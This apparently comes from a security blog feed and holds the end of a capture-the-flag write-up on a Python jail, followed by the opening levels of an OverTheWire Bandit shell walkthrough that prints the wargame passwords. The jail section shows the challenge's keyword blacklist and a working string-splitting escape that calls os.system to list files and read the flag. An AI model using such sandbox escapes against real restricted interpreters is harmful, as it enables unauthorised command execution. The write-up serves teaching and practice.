<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;__builtins__&#39;</span>, <span style="color:#e6db74">&#39;__import__&#39;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>, <span style="color:#e6db74">&#39;import&#39;</span>, <span style="color:#e6db74">&#39;from&#39;</span>, <span style="color:#e6db74">&#39;os&#39;</span>, <span style="color:#e6db74">&#39;sys&#39;</span>, <span style="color:#e6db74">&#39;system&#39;</span>, <span style="color:#e6db74">&#39;timeit&#39;</span>, <span style="color:#e6db74">&#39;base64commands&#39;</span>, <span style="color:#e6db74">&#39;subprocess&#39;</span>, <span style="color:#e6db74">&#39;pty&#39;</span>, <span style="color:#e6db74">&#39;platform&#39;</span>, <span style="color:#e6db74">&#39;open&#39;</span>, <span style="color:#e6db74">&#39;read&#39;</span>, <span style="color:#e6db74">&#39;write&#39;</span>, <span style="color:#e6db74">&#39;dir&#39;</span>, <span style="color:#e6db74">&#39;type&#39;</span>]
</code></pre></div><p>Replace the original <code>blacklist.BLACKLIST</code> with <code>blacklist</code> and we have an equal shell to theirs.</p>
<p>Now, I wonder if degarbling the <code>final_cmd</code> will help?</p>
<p><code>uOaoBPLLRN -&gt; sandbox_fd</code></p>
<p><code>int(((54 * 8) / 16) * (1/3) - 8) -&gt; 1</code>
<code>uDwjTIgNRU -&gt; one</code></p>
<p><code>ORppRjAVZL -&gt; first_line_words_array</code></p>
<p><code>AAnBLJqtRv -&gt; second_word</code></p>
<p><code>bAfGdqzzpg -&gt; last_word</code></p>
<p>The second word on this file is &ldquo;base64&rdquo; and the last word on the first line is &ldquo;b64decode&rdquo;
This next line grabs the b64decode sub module and puts its reference in &ldquo;HrjYMvtxwA&rdquo; I won&rsquo;t rename this because it might be useful for blacklist evasion.</p>
<p><code>X19pbXBvcnRfXw==</code> decodes to <code>__import__</code> and <code>bnVtcHk=</code> decodes to&hellip; <code>numpy</code>?? Numpy pyjail escape?</p>
<p>Anyway, not renaming <code>RMbPOQHCzt</code> either, numpy might be useful.</p>
<p>Here is the final file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
<span style="color:#75715e"># import blacklist  # you don&#39;t get to see this :p</span>
blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;__builtins__&#39;</span>, <span style="color:#e6db74">&#39;__import__&#39;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>, <span style="color:#e6db74">&#39;import&#39;</span>, <span style="color:#e6db74">&#39;from&#39;</span>, <span style="color:#e6db74">&#39;os&#39;</span>, <span style="color:#e6db74">&#39;sys&#39;</span>, <span style="color:#e6db74">&#39;system&#39;</span>, <span style="color:#e6db74">&#39;timeit&#39;</span>, <span style="color:#e6db74">&#39;base64commands&#39;</span>, <span style="color:#e6db74">&#39;subprocess&#39;</span>, <span style="color:#e6db74">&#39;pty&#39;</span>, <span style="color:#e6db74">&#39;platform&#39;</span>, <span style="color:#e6db74">&#39;open&#39;</span>, <span style="color:#e6db74">&#39;read&#39;</span>, <span style="color:#e6db74">&#39;write&#39;</span>, <span style="color:#e6db74">&#39;dir&#39;</span>, <span style="color:#e6db74">&#39;type&#39;</span>]

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Don&#39;t worry, if you break out of this one, we have another one underneath so that you won&#39;t
</span><span style="color:#e6db74">wreak any havoc!
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;EduPy 3.8.2&#34;</span>)
    <span style="color:#66d9ef">while</span> True:
        <span style="color:#66d9ef">try</span>:
            command <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt;&gt;&gt; &#34;</span>)
            <span style="color:#66d9ef">if</span> any([x <span style="color:#f92672">in</span> command <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> blacklist]):
                <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;not allowed!!&#34;</span>)

            final_cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">sandbox_fd = open(&#34;sandbox.py&#34;, &#34;r&#34;)
</span><span style="color:#e6db74">one = 1
</span><span style="color:#e6db74">first_line_words_array = sandbox_fd.readlines()[one].strip().split(&#34; &#34;)
</span><span style="color:#e6db74">second_word = first_line_words_array[one]
</span><span style="color:#e6db74">last_word = first_line_words_array[-one]
</span><span style="color:#e6db74">sandbox_fd.close()
</span><span style="color:#e6db74">HrjYMvtxwA = getattr(__import__(second_word), last_word)
</span><span style="color:#e6db74">RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b&#39;X19pbXBvcnRfXw==&#39;).decode(&#39;utf-8&#39;)](HrjYMvtxwA(b&#39;bnVtcHk=&#39;).decode(&#39;utf-8&#39;))</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">+</span> command
            <span style="color:#66d9ef">exec</span>(final_cmd)

        <span style="color:#66d9ef">except</span> (<span style="color:#a6e22e">KeyboardInterrupt</span>, <span style="color:#a6e22e">EOFError</span>):
            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
            <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#34;Exception: {e}&#34;</span>)

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    exit(main())
</code></pre></div><p>Try the classic pyjail escape, but try to accomodate for the blacklisted strings.
<code>print(getattr(getattr(globals()['__buil'+'tins__'], '__im'+'port__')('o'+'s'), 'sy'+'stem')('ls .'))</code>
Uh&hellip; It worked.</p>
<p><code>print(getattr(getattr(globals()['__buil'+'tins__'], '__im'+'port__')('o'+'s'), 'sy'+'stem')('cat flag.txt'))</code>
Done!
Seems like the reversing wasn&rsquo;t needed at all.</p>
]]></content></item><item><title>Over The Wire - Bandit Walkthrough</title><link>/posts/otw-bandit_walkthrough/</link><pubDate>Thu, 26 Dec 2019 22:41:28 +0000</pubDate><guid>/posts/otw-bandit_walkthrough/</guid><description>Introduction Over The Wire provides multiple challenges focused on different topics of computer systems. The one which we will solve here is Bandit. This is focused on SSH communication, bash commands and some basic UNIX concepts.
To connect to any of these levels you need 2 things: a username, and a password. Each level has a username in the format bandit&amp;lt;level_number&amp;gt; (without the &amp;lsquo;&amp;lt;&amp;rsquo; &amp;lsquo;&amp;gt;') so for level 0 the username would be bandit0.</description><content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p><a href="http://overthewire.org/wargames/">Over The Wire</a> provides multiple challenges focused on different topics of computer systems.
The one which we will solve here is Bandit. This is focused on SSH communication, bash commands and some basic UNIX concepts.</p>
<p>To connect to any of these levels you need 2 things: a username, and a password. Each level has a username in the format <strong>bandit&lt;level_number&gt;</strong> (without the &lsquo;&lt;&rsquo; &lsquo;&gt;') so for level 0 the username would be <strong>bandit0</strong>. Then each level also has a password. Usually you find the password for the next level on the current one, this meaning that in level 0 you will find the password for level 1, which you will login with <strong>bandit1</strong> and the password you found.</p>
<p>You can read more about the challenge and how it works <a href="http://overthewire.org/wargames/bandit/">here</a>.</p>
<p>Levels:</p>
<ul>
<li><a href="#introduction">Introduction</a>
<ul>
<li><a href="#level-0">Level 0</a></li>
<li><a href="#level-1">Level 1</a></li>
<li><a href="#level-2">Level 2</a></li>
<li><a href="#level-3">Level 3</a></li>
<li><a href="#level-4">Level 4</a></li>
<li><a href="#level-5">Level 5</a></li>
<li><a href="#level-6">Level 6</a></li>
<li><a href="#level-7">Level 7</a></li>
<li><a href="#level-8">Level 8</a></li>
<li><a href="#level-9">Level 9</a></li>
<li><a href="#level-10">Level 10</a></li>
<li><a href="#level-11">Level 11</a></li>
<li><a href="#level-12">Level 12</a></li>
<li><a href="#level-13">Level 13</a></li>
<li><a href="#level-14">Level 14</a></li>
<li><a href="#level-15">Level 15</a></li>
<li><a href="#level-16">Level 16</a></li>
<li><a href="#level-17">Level 17</a></li>
<li><a href="#level-18">Level 18</a></li>
<li><a href="#level-19">Level 19</a></li>
<li><a href="#level-20">Level 20</a></li>
<li><a href="#level-21">Level 21</a></li>
<li><a href="#level-22">Level 22</a></li>
<li><a href="#level-23">Level 23</a></li>
<li><a href="#level-24">Level 24</a></li>
<li><a href="#level-25">Level 25</a></li>
<li><a href="#level-26">Level 26</a></li>
<li><a href="#level-27">Level 27</a></li>
<li><a href="#level-28">Level 28</a></li>
<li><a href="#level-29">Level 29</a></li>
<li><a href="#level-30">Level 30</a></li>
<li><a href="#level-31">Level 31</a></li>
<li><a href="#level-32">Level 32</a></li>
<li><a href="#level-33">Level 33</a></li>
<li><a href="#level-34">Level 34</a></li>
</ul>
</li>
</ul>
<h2 id="level-0">Level 0</h2>
<p>So we need to login as <strong>bandit0</strong> using the password <strong>bandit0</strong> at <strong>bandit.labs.overthewire.org</strong> using SSH. It&rsquo;s also said that the connection should be done to port <strong>2220</strong>.</p>
<p>We can use the <strong>man</strong> command followed by <strong>ssh</strong> to get information on how to use ssh. The <strong>man</strong> command is super useful, but sometimes can present you with more information then you need. A nice alternative is the <strong>tldr</strong> command which you can install through your package manager (have in mind that you won&rsquo;t be able to use it once you login through ssh since you can&rsquo;t install anything in the bandit machine). It also takes the command that you want to see more information as an argument but it shows you some examples frequently used. So by doing <code>tldr ssh</code> we get one of the lines saying</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">- Connect to a remote server using a specific port:                    
  ssh username@remote_host -p <span style="color:#ae81ff">2222</span>
</code></pre></div><p>which we can change with the arguments we have, resulting in <code>ssh bandit0@bandit.labs.overthewire.org -p 2220</code>. Now we know how to make a basic ssh connection with a username and a port. After we execute the command a password is asked. We insert <strong>bandit0</strong> and finally we have an open ssh connection, which we can see by the prompt <code>bandit0@bandit:~$</code>.</p>
<p>Ok now we can go to the next level.</p>
<h2 id="level-1">Level 1</h2>
<p>We will use the connection established in <a href="#level-0">Level 0</a> to solve this level. They say that the password for the next level is stored in the file called <strong>readme</strong>. To print the content of the file we can use the <code>cat</code> command which takes the file you want to see.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit0@bandit:~$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
</code></pre></div><p>So now that we have the password we can go to the next level.</p>
<h2 id="level-2">Level 2</h2>
<p>In this level the password is in a file called <code>-</code>. The problem here is that the character <code>-</code> is used as a special character to represent stdin (<a href="https://unix.stackexchange.com/questions/16357/usage-of-dash-in-place-of-a-filename">more information on this here</a>), so in this case we should be able to see its content if we specify the filename in a path format like</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit1@bandit:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
</code></pre></div><p>The <code>.</code> means the current directory, so what we are representing is the current directory, which inside has a file named <code>-</code>.</p>
<h2 id="level-3">Level 3</h2>
<p>So now the file that we want to see is called <code>spaces in this filename</code>. The challenge here is that if we do like before and use the command <strong>cat</strong> followed by the name we get this</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit2@bandit:~$ cat spaces in this filename 
cat: spaces: No such file or directory
cat: in: No such file or directory
cat: this: No such file or directory
cat: filename: No such file or directory
</code></pre></div><p>Wait what???</p>
<p>So the problem here is that as we&rsquo;ve seen before commands take arguments so what we are doing is calling the <strong>cat</strong> command with 4 arguments: <strong>spaces</strong>, <strong>in</strong>, <strong>this</strong> and <strong>filename</strong>. This is not what we want at all. What we want is to print the file named <code>spaces in this filename</code>. So the way to do it is to give it to the command as a whole string by surrounding it with <code>&quot;</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit2@bandit:~$ cat <span style="color:#e6db74">&#34;spaces in this filename&#34;</span> 
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
</code></pre></div><p>Onto the next level.</p>
<h2 id="level-4">Level 4</h2>
<p>Now the file that contains the password is a hidden file and is in the <code>inhere</code> directory. To change directory we use the <strong>cd</strong> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit3@bandit:~$ cd inhere
</code></pre></div><p>Now we know that we are in the <code>inhere</code> directory because the bash prompt says it <code>bandit3@bandit:~/inhere$</code>.</p>
<p>If we list the files in the current directory, which we can do by executing the command <code>ls</code> we get a blank listing.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit3@bandit:~/inhere$ ls
bandit3@bandit:~/inhere$ 
</code></pre></div><p>Ok it makes sense. The challenge said that the file was hidden. You can search a bit about hidden files in UNIX systems and you will eventually find out that by convention the hidden files start with a <code>.</code>. To list hidden files you can do <code>man ls</code> and see that there is a flag that you can pass to list <strong>all</strong> entries, not ignoring those starting with <code>.</code> (to quit <strong>man</strong> simply hit <strong>q</strong>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit3@bandit:~/inhere$ ls -a
.  ..  .hidden
</code></pre></div><p>Ok as we can see there is a file named <code>.hidden</code> that should be the one (the other two <code>.</code>, <code>..</code> are the current directory and the parent directory respectively).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit3@bandit:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
</code></pre></div><p>So by using <strong>cat</strong> with the filename we can then get the password for the next level.</p>
<h2 id="level-5">Level 5</h2>
<p>So now the password is stored in the only human-readable file in the <code>inhere</code> directory. As we&rsquo;ve seen before to change directory we can use the <strong>cd</strong> command. Then we can list the files in the current directory by using ls (i use the <strong>-l</strong> flag just to display it as a vertical listing).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit4@bandit:~/inhere$ ls -l
total <span style="color:#ae81ff">40</span>
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file00
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file01
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file02
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file03
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file04
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file05
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file06
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file07
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file08
-rw-r----- <span style="color:#ae81ff">1</span> bandit5 bandit4 <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> -file09
</code></pre></div><p>Ok so we have 10 files. The listing doesn&rsquo;t tells us much about them. On the other hand one of suggested commands <strong>file</strong> can tell us interesting things about each file, maybe know which one is human-readable we hope. So what we can do is calling <strong>file</strong> on all the files in this directory. There are two ways to do this: the bruteforce way and the smart way. The bruteforce way is to run <code>file -fileXX</code> (replacing XX for the file number) for each file in the directory. The smart way is to use the symbol <code>*</code> that matches with every file name, this meaning that using <code>*</code> or every filename separated by spaces is the same.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit4@bandit:~/inhere$ file *
file: Cannot open <span style="color:#e6db74">`</span>ile00<span style="color:#e6db74">&#39; (No such file or directory).
</span><span style="color:#e6db74">file: Cannot open `ile01&#39;</span> <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>.
file: Cannot open <span style="color:#e6db74">`</span>ile02<span style="color:#e6db74">&#39; (No such file or directory).
</span><span style="color:#e6db74">file: Cannot open `ile03&#39;</span> <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>.
file: Cannot open <span style="color:#e6db74">`</span>ile04<span style="color:#e6db74">&#39; (No such file or directory).
</span><span style="color:#e6db74">file: Cannot open `ile05&#39;</span> <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>.
file: Cannot open <span style="color:#e6db74">`</span>ile06<span style="color:#e6db74">&#39; (No such file or directory).
</span><span style="color:#e6db74">file: Cannot open `ile07&#39;</span> <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>.
file: Cannot open <span style="color:#e6db74">`</span>ile08<span style="color:#e6db74">&#39; (No such file or directory).
</span><span style="color:#e6db74">file: Cannot open `ile09&#39;</span> <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>.
</code></pre></div><p>&ldquo;Wait&hellip; You said this was the smart way and it didn&rsquo;t work, that doesn&rsquo;t seem very smart to me.&rdquo; I know, i know just give me a chance. So the problem here is that the files begin by a <code>-</code>, and we&rsquo;ve encountered this problem before. Let&rsquo;s do as we did before by putting the filenames in a path like format, so <code>./*</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit4@bandit:~/inhere$ file ./*
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data
</code></pre></div><p>Ohhh so now it worked, okay. This tells us that the only file that has an <code>ASCII text</code> type is <code>-file07</code>. This is the one.</p>
<p>So we use <strong>cat</strong> no surprise there and we get</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit4@bandit:~/inhere$ cat ./-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
</code></pre></div><p>Done. Next level.</p>
<h2 id="level-6">Level 6</h2>
<p>So now the password is in a file stored in the <code>inhere</code> directory and has three properties:</p>
<ul>
<li>human-readable</li>
<li>1033 bytes in size</li>
<li>not executable</li>
</ul>
<p>So lets <strong>cd</strong> onto <code>inhere</code> and the list its content.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit5@bandit:~/inhere$ ls -l
total <span style="color:#ae81ff">80</span>
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere00
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere01
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere02
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere03
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere04
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere05
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere06
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere07
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere08
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere09
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere10
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere11
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere12
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere13
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere14
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere15
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere16
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere17
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere18
drwxr-x--- <span style="color:#ae81ff">2</span> root bandit5 <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> maybehere19
</code></pre></div><p>Ok so here bruteforce might not be worth it since each of those entries is a directory and has multiple files. We can use one of the suggested commands named <strong>find</strong> which, guess what, finds stuff.</p>
<p>So to learn a bit about find you can use <strong>man</strong> and just so you know you can search words in <strong>man</strong> by hitting <strong>/</strong> and then typing the word you want to lookup. We can lookup <code>size</code> and <code>readable</code> in there which will give us 2 flags to use: <code>-size</code> and <code>-readable</code>. <code>-size</code> works with the number of units you want followed by the character that represents the unit. So in our case we want 1033 bytes, so the result will be <code>-size 1033c</code>. The readable flag needs no argument. The final command is:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit5@bandit:~/inhere$ find -size 1033c -readable
./maybehere07/.file2
</code></pre></div><p><strong>find</strong> searches by default in your current directory. The result is only one file so we don&rsquo;t need to care about it being executable or not.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
</code></pre></div><p>Onto the next level.</p>
<h2 id="level-7">Level 7</h2>
<p>In this level the password is stored <strong>somewhere in the server</strong> with a few properties:</p>
<ul>
<li>owned by user bandit7</li>
<li>owned by group bandit6</li>
<li>33 bytes in size</li>
</ul>
<p><strong>find</strong> should do the job here as well, it&rsquo;s just a matter of finding the flags associated with the functionalities. We already know how to use the <code>-size</code> so that&rsquo;s going to be <code>-size 33c</code>. After digging a bit in the <strong>man</strong>, we can see that <code>-user</code> and <code>-group</code> do what we want.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit6@bandit:~$ find -user bandit7 -group bandit6 -size 33c
bandit6@bandit:~$
</code></pre></div><p>Wait&hellip; No file matched what we wanted. The trick here is that it says <strong>somewhere in the server</strong> so to search everywhere and not just the current directory we have to give the <code>/</code> directory (which is the root) as an argument to <strong>find</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c
find: ‘/run/lvm’: Permission denied
<span style="color:#f92672">(</span>...more...<span style="color:#f92672">)</span>
find: ‘/var/cache/apt/archives/partial’: Permission denied
/var/lib/dpkg/info/bandit7.password
find: ‘/var/lib/apt/lists/partial’: Permission denied
<span style="color:#f92672">(</span>...more...<span style="color:#f92672">)</span>
find: ‘/boot/lost+found’: Permission denied
</code></pre></div><p>Well as you can see there are a lot of errors but the file is there. If you want to clean it up you can redirect the error output to <code>/dev/null</code> so the errors don&rsquo;t show up.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt; /dev/null
/var/lib/dpkg/info/bandit7.password
</code></pre></div><p>Ok so we found the file. We just need to use <strong>cat</strong> and we should get the password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit6@bandit:~$ cat <span style="color:#66d9ef">$(</span>find / -user bandit7 -group bandit6 -size 33c 2&gt; /dev/null<span style="color:#66d9ef">)</span>
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
</code></pre></div><p>Quick note, what i did in the previous command was telling bash that <strong>cat</strong> took the result of another command (<strong>find</strong>) as an argument, we do this by surrounding it with <code>$()</code>. This tells bash that what&rsquo;s inside is not only text, it&rsquo;s actually a command. So then the resulting output of the <strong>find</strong> command <code>/var/lib/dpkg/info/bandit7.password</code> will be an argument to <strong>cat</strong>.</p>
<h2 id="level-8">Level 8</h2>
<p>New challenge. The password is stored in the file <code>data.txt</code> next to the word <code>millionth</code>. Ok so let&rsquo;s see the content of the file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit7@bandit:~$ cat data.txt
humiliation<span style="color:#e6db74">&#39;s   47r0YuNylaQ3k6HqGF5NsPPiGuolDCjn
</span><span style="color:#e6db74">malarkey&#39;</span>s      0huyJeRwvtJaoyRmJjQFsRnQcYG4gDir
<span style="color:#f92672">(</span>...A LOT MORE...<span style="color:#f92672">)</span>
chemical        7D5J0CAJMWr2Ryb9uB0kSRuqz7BQPv6X
shaded  v5MBdtwMnmZ9YlheYVOxBJiOSxp9BeAA
</code></pre></div><p>We won&rsquo;t be able to find this just by seeing the file&rsquo;s content, we will need some sort of finder, but for a file&rsquo;s content. So once again we will see the suggested commands, and one that fits our needs is <strong>grep</strong>. Now a way we can do this is by using the file&rsquo;s content as the content to look in. On the <strong>man grep</strong> page it says that you can pass the file as an argument, the other way is that if you don&rsquo;t specify a file <strong>grep</strong> will use the standard input. So the first way of doing this is:</p>
